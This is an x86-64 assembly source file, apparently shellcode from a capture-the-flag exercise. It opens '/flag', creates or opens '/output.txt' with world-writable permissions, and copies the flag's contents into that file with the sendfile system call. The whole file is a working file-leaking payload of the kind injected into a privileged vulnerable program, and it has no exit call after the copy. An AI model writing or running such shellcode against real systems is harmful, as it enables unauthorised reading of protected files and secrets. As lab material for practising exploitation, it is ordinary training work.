.global _start
_start:
.intel_syntax noprefix
        mov rax, 2
        lea rdi, [rip+flag]
        mov rsi, 0
        mov rdx, 0
        syscall

        mov r14, rax

        mov rax, 2
        lea rdi, [rip+filename]
        mov rsi, 417
        mov rdx, 438
        syscall

        mov r13, rax

        mov rax, 40
        mov rdi, r13
        mov rsi, r14
        mov rdx, 0 
        mov r10, 1000
        syscall

filename:
        .string "/output.txt"

flag:
        .string "/flag"
